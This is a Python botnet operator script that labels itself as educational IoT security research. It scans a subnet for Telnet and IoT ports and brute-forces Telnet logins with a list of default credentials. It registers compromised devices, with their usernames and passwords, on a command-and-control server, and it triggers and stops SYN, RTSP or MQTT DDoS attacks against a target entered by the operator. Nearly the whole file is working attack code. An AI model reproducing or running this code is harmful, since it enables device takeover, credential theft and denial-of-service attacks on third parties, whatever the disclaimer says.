#!/usr/bin/env python3
"""
IoT Security Research - Exploit Script
Educational Purpose Only - For Controlled Lab Environment
"""

import socket
import telnetlib
import subprocess
import threading
import time
import requests
import json
import logging
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import sys
import argparse

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('exploit.log'),
        logging.StreamHandler()
    ]
)

class IoTExploiter:
    def __init__(self, cnc_server_ip, subnet=None):
        self.cnc_server_ip = cnc_server_ip
        self.cnc_url = f"http://{cnc_server_ip}:5000"
        self.subnet = subnet or "11.10.10.0/24"
        
        # Common IoT device credentials
        self.credentials = [
            ("admin", "admin"),
            ("root", "root"),
            ("admin", "password"),
            ("root", "password"),
            ("admin", ""),
            ("root", ""),
            ("admin", "1234"),
            ("root", "1234"),
            ("ipcamadmin", "admin"),
            ("temphumidadmin", "admin"),
            ("admin", "admin123"),
            ("root", "root123"),
            ("", ""),
        ]
        
        self.compromised_devices = []
        self.scan_results = []
        
    def log(self, message):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        logging.info(f"[Exploiter] {message}")
        print(f"[{timestamp}] {message}")
    
    def scan_network(self):
        """Scan network for vulnerable IoT devices using direct nmap command"""
        try:
            self.log(f"Starting network scan on {self.subnet}")

            # Phase 1: Quick scan for active hosts
            self.log("Phase 1: Quick scan for active hosts...")
            result = subprocess.run([
                "nmap", "-sn", self.subnet
            ], capture_output=True, text=True)
            output = result.stdout
            active_hosts = []
            for line in output.splitlines():
                if line.startswith("Nmap scan report for"):
                    ip = line.split()[-1]
                    active_hosts.append(ip)
            if not active_hosts:
                self.log("No active hosts found")
                return []
            self.log(f"Found {len(active_hosts)} active hosts")

            # Phase 2: Detailed scan of active hosts
            self.log("Phase 2: Detailed scan of active hosts...")
            target_ports = "23,80,443,1883,8883,8080"  # Common IoT ports
            vulnerable_hosts = []
            for host in active_hosts:
                result = subprocess.run([
                    "nmap", "-p", target_ports, "-sV", host
                ], capture_output=True, text=True)
                output = result.stdout
                current_ip = host
                for line in output.splitlines():
                    # Example: 23/tcp   open  telnet
                    if "/tcp" in line and "open" in line:
                        parts = line.split()
                        port = int(parts[0].split("/")[0])
                        service = parts[2] if len(parts) > 2 else "unknown"
                        self.log(f"Found open port {port} ({service}) on {current_ip}")
                        vulnerable_hosts.append({
                            'ip': current_ip,
                            'port': port,
                            'service': service
                        })
            # After scan, keep only the latest result per IP
            latest_results = {}
            for device in vulnerable_hosts:
                ip = device['ip']
                latest_results[ip] = device  # Overwrite, so last is latest
            self.scan_results = list(latest_results.values())
            self.log(f"Scan complete. Found {len(self.scan_results)} unique potentially vulnerable devices")
            
            # Send scan results to C&C server's /add-scan-result endpoint
            for device in self.scan_results:
                try:
                    response = requests.post(
                        f"{self.cnc_url}/add-scan-result",
                        json={
                            'ip': device['ip'],
                            'port': device['port'],
                            'service': device['service']
                            # Credentials are not available yet at scan stage
                        },
                        timeout=5
                    )
                    if response.status_code != 200:
                        self.log(f"Failed to send scan result for {device['ip']} to C&C server. Status code: {response.status_code}")
                except Exception as e:
                    self.log(f"Error sending scan result for {device['ip']} to C&C server: {e}")

            return self.scan_results
        except Exception as e:
            self.log(f"Error during network scan: {e}")
            return []
    
    def attempt_telnet_login(self, host, port, username, password):
        """Attempt telnet login with given credentials"""
        try:
            tn = telnetlib.Telnet(host, port, timeout=5)
            
            # Wait for login prompt
            tn.read_until(b"login: ", timeout=5)
            tn.write(username.encode() + b"\n")
            
            # Wait for password prompt
            tn.read_until(b"Password: ", timeout=5)
            tn.write((password or "").encode() + b"\n")
            
            # Check for successful login
            response = tn.read_until(b"$", timeout=5)
            success = any(prompt in response for prompt in [b"$", b"#", b">"])
            
            tn.close()
            return success
            
        except Exception:
            return False
    
    def register_compromised_device(self, ip, username, password):
        """Register compromised device with C&C server in the devices table."""
        try:
            # Rely primarily on C&C server as the source of truth for compromised devices.
            # Local list self.compromised_devices will be synced by fetch_compromised_devices_from_c2.

            # Register with C&C server using the bot-checkin endpoint structure
            # This will insert/update the device in the 'devices' table with status 'online'
            payload = {
                'ip': ip,
                'username': username, # Include username and password for storage
                'password': password,
                'status': 'online'  # Set status to 'online' after compromise
            }
            self.log(f"Registering device {ip} with C&C server. Payload: {payload}")
            response = requests.post(
                f"{self.cnc_url}/bot-checkin", # Using bot-checkin endpoint for registration
                json=payload,
                timeout=10
            )

            if response.status_code == 200:
                self.log(f"Successfully registered compromised device {ip} with C&C server.")
                # After successful registration, immediately fetch updated list
                self.fetch_compromised_devices_from_c2()
                return True
            else:
                self.log(f"Failed to register compromised device {ip} with C&C server. Status code: {response.status_code}")
                self.log(f"Response: {response.text}")
                return False

        except Exception as e:
            self.log(f"Error registering compromised device {ip}: {e}")
            return False
    
    def deploy_bot(self, ip, username, password):
        """Deploy bot to compromised device"""
        # Logic removed as C2-managed Telnet DDoS is the primary method for this scenario.
        pass
    
    def save_results(self):
        """Save scan and exploitation results"""
        try:
            # Create results directory if it doesn't exist
            os.makedirs('results', exist_ok=True)
            
            # Save scan results
            with open('results/scan_results.json', 'w') as f:
                json.dump(self.scan_results, f, indent=4)
            
            # Save compromised devices
            with open('results/compromised_devices.json', 'w') as f:
                json.dump(self.compromised_devices, f, indent=4)
            
            self.log("Results saved to results/ directory")
            
        except Exception as e:
            self.log(f"Error saving results: {e}")
    
    def infect_devices(self):
        """Infect all compromised devices by downloading and running the bot client via Telnet."""
        # Logic removed as C2-managed Telnet DDoS is the primary method for this scenario.
        pass
    
    def view_infected_devices(self):
        """View infected devices."""
        # Removed as C2 manages Telnet sessions and exploit fetches compromised list from C2.
        pass
    
    def run_hping3_via_telnet(self, ip, username, password, hping3_cmd):
        """Run hping3 via Telnet, handle sudo password prompt."""
        # Removed as C2 handles Telnet execution and session management.
        pass

    def start_ddos_via_c2(self):
        """Initiate Telnet-based DDoS attack via C2 server API."""
        if not self.compromised_devices:
            print("No compromised devices available. Please run brute-force first.")
            return

        print("\nStarting Telnet-based DDoS attack via C2 server...")
        target_ip = input("Enter target IP to attack: ")
        attack_type = input("Enter attack type (syn/rtsp/mqtt): ").lower()

        # Validate attack type
        if attack_type not in ['syn', 'rtsp', 'mqtt']:
            print("Invalid attack type. Please choose syn, rtsp, or mqtt.")
            return

        try:
            response = requests.post(
                f"{self.cnc_url}/start-telnet-ddos", # Call the specific Telnet DDoS endpoint
                json={
                    "target": target_ip,
                    "attack_type": attack_type
                },
                timeout=30 # Increased timeout for C2 processing Telnet connections
            )
            response_data = response.json()
            print(f"C2 server response: {response_data}")
            if response.status_code == 200 and response_data.get('status') == 'success':
                 print(f"Successfully attempted to start DDoS on {response_data.get('successful_ips', [])} devices.")
            else:
                 print(f"Failed to start DDoS: {response_data.get('message', response_data.get('error', 'Unknown error'))}")

        except requests.exceptions.Timeout:
             print("Error: C2 server /start-telnet-ddos request timed out.")
        except Exception as e:
            print(f"Failed to initiate Telnet DDoS via C2: {e}")

    def stop_ddos_via_c2(self):
        """Stop Telnet-based DDoS attack via C2 server API."""
        print("\nStopping Telnet-based DDoS attack via C2 server...")
        # No need to check self.compromised_devices here, C2 manages active sessions
        try:
            # Call the specific Telnet DDoS stop endpoint
            response = requests.post(
                f"{self.cnc_url}/stop-telnet-ddos",
                timeout=30 # Increased timeout for C2 processing stop commands
            )
            response_data = response.json()
            print(f"C2 server response: {response_data}")
            if response.status_code == 200 and response_data.get('status') in ['success', 'partial_success']:
                 print(f"Successfully attempted to stop DDoS on {response_data.get('stopped_count', 0)} devices.")
                 if response_data.get('errors'):
                      print(f"Errors stopping on: {list(response_data['errors'].keys())}")
            else:
                 print(f"Failed to stop DDoS: {response_data.get('message', response_data.get('error', 'Unknown error'))}")

        except requests.exceptions.Timeout:
             print("Error: C2 server /stop-telnet-ddos request timed out.")
        except Exception as e:
            print(f"Failed to stop Telnet DDoS via C2: {e}")

    def brute_force_telnet(self):
        """Brute force telnet credentials for discovered devices"""
        if not self.scan_results:
            print("No scan results available. Please run a scan first.")
            return
            
        print("\nBrute-forcing Telnet credentials...")
        self.compromised_devices = []
        
        for target in self.scan_results:
            if target['service'].lower() == 'telnet' and target['port'] == 23:
                target_ip = target['ip']
                self.log(f"Attempting brute-force on {target_ip}")
                
                for username, password in self.credentials:
                    if self.attempt_telnet_login(target_ip, 23, username, password):
                        self.log(f"Success! {target_ip} - {username}:{password}")
                        self.register_compromised_device(target_ip, username, password)
                        break
                else:
                    self.log(f"Brute-force failed for {target_ip}")
        
        print("\nBrute-force completed!")
        self.print_status()

    def fetch_scan_results_from_c2(self):
        """Fetch scan results from the C2 server and load into self.scan_results."""
        try:
            response = requests.get(f"{self.cnc_url}/get-scan-results", timeout=10)
            if response.status_code == 200:
                self.scan_results = response.json()
                self.log(f"Loaded {len(self.scan_results)} scan results from C2 server.")
            else:
                self.log(f"Failed to fetch scan results from C2 server. Status code: {response.status_code}")
        except requests.exceptions.Timeout:
             self.log("Error: C2 server /get-scan-results request timed out.")
        except Exception as e:
            self.log(f"Error fetching scan results: {e}")

    def fetch_compromised_devices_from_c2(self):
        """Fetch compromised devices (including credentials) from the C2 server."""
        try:
            response = requests.get(f"{self.cnc_url}/get-compromised-devices", timeout=10) # Call new endpoint
            if response.status_code == 200:
                self.compromised_devices = response.json()
                self.log(f"Loaded {len(self.compromised_devices)} compromised devices from C2 server.")
            else:
                self.log(f"Failed to fetch compromised devices from C2 server. Status code: {response.status_code}")
        except requests.exceptions.Timeout:
             self.log("Error: C2 server /get-compromised-devices request timed out.")
        except Exception as e:
            self.log(f"Error fetching compromised devices: {e}")

    def print_status(self):
        """Print current status of scan results and compromised devices"""
        print("\n" + "="*50)
        print("Current Status:")
        print("="*50)

        # Print scan results
        print("\n[Scan Results]")
        if not self.scan_results:
            print("No scan results available")
        else:
            for device in self.scan_results:
                print(f"IP: {device['ip']}, Port: {device['port']}, Service: {device['service']}")

        # Print compromised devices
        print("\n[Compromised Devices]")
        if not self.compromised_devices:
            print("No compromised devices available")
        else:
            # Sort devices by IP for consistent display
            sorted_devices = sorted(self.compromised_devices, key=lambda x: x['ip'])
            for device in sorted_devices:
                print(f"IP: {device['ip']}")
                print(f"Credentials: {device['username']}:{device['password']}")
                print(f"Status: {device.get('status', 'Unknown')}") # Display status from C2
                # The timestamp from the C2 endpoint /get-compromised-devices is 'last_seen'
                print(f"Last Seen: {device.get('last_seen', 'N/A')}")
                print("-"*30)

        print("="*50)

    def interactive_menu(self):
        """Interactive menu for user control"""
        while True:
            # Always fetch scan results and compromised devices at the start of the menu loop
            self.fetch_scan_results_from_c2()
            self.fetch_compromised_devices_from_c2()

            # Print current status
            self.print_status()

            print("\nAvailable Actions:")
            print("1. Scan network for vulnerable devices")
            print("2. Brute-force Telnet credentials")
            print("3. Start Telnet DDoS attack (via C2)")
            print("4. Stop Telnet DDoS attack (via C2)")
            print("5. Save results to disk")
            print("6. Exit")

            choice = input("\nEnter your choice (1-6): ")

            if choice == "1":
                print("\nScanning network...")
                self.scan_network()
                print("\nScan completed!")
                # Status is printed at the start of the next loop iteration

            elif choice == "2":
                if not self.scan_results:
                    print("No scan results available. Please run a scan first.")
                else:
                    print("\nBrute-forcing Telnet credentials...")
                    self.brute_force_telnet()
                    # print status is called inside brute_force_telnet after registration

            elif choice == "3":
                # Option 3 now starts Telnet DDoS via C2
                self.start_ddos_via_c2()

            elif choice == "4":
                # Option 4 now stops Telnet DDoS via C2
                self.stop_ddos_via_c2()

            elif choice == "5":
                self.save_results()
                print("Results saved successfully!")

            elif choice == "6":
                print("Exiting...")
                break

            else:
                print("Invalid choice. Please try again.")

            input("\nPress Enter to continue...")

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='IoT Security Research - Exploit Script')
    parser.add_argument('--cnc', required=True, help='C&C server IP address')
    parser.add_argument('--subnet', help='Target subnet (default: 11.10.10.0/24)')
    args = parser.parse_args()

    # Ping the C&C server before proceeding (robust for Ubuntu/Linux)
    import platform
    import subprocess
    cnc_ip = args.cnc
    print(f"Checking connectivity to C&C server at {cnc_ip}...")
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    try:
        result = subprocess.run(['ping', param, '1', cnc_ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout.lower()
        if 'ttl=' in output or 'bytes from' in output:
            print(f"C&C server {cnc_ip} is reachable. Starting exploit menu...")
        else:
            print(f"Cannot reach C&C server at {cnc_ip}. Exiting.")
            exit(1)
    except Exception as e:
        print(f"Error pinging C&C server: {e}")
        exit(1)

    exploiter = IoTExploiter(args.cnc, args.subnet)
    exploiter.interactive_menu()

if __name__ == "__main__":
    main()